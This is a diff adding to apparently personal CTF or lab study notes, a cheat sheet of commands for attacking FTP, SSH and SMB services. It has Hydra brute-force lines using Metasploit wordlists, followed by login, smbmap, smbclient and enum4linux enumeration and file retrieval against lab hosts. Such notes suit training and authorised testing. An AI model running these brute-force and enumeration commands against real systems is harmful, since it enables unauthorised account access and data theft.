@@ -302,3 +302,24 @@ DO MIMIKATZ FIRST!
 1. After FTP found: try anonymous `ftp 10.10.x.x` 
 2. If not 1. : find namp scripts `ls -la /usr/share/nmap/scripts/ | grep ftp-* `
 3. Hydra bruteforce: `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.10.x.x -t 4 ftp`
+4. login: `ftp 10.10.x.x` --> fill in username and password --> to download / show file `get secret.txt`
+
+### Exploiting SSH
+- TCP port 22
+1. Brute force attack: `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt 10.10.x.x -t 4 ssh`
+2. login: `ssh sysadmin@10.10.x.x`
+
+### Exploiting SAMBA
+- port 445, maybe 139
+- brute force, SMBmap to enumerate, SMBclient also
+1. `nmap -sV 10.10.x.x`
+2.  Brute-force: DEMO command:`hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.10.x.x -t 4 smb`
+3.  SMBMAP: `smbmap -H 10.10.x.x -u username -p password`
+4.  SMBCLIENT share access: `smbclient //10.10.x.x/sharename  -U username` <-- need passwords optained for this
+5.  in smb: `dir` etc, `get file.tar.gz` <-- after on linux`tar xzf file.tar.gz`
+6.  flag in nancy, admin. 
+7.  
+**Enum4linux**
+1. `enum4linux -a 10.10.x.x`
+2. using after bruteforce: `enum4linux -a -u username -p password 10.10.x.x`
+   
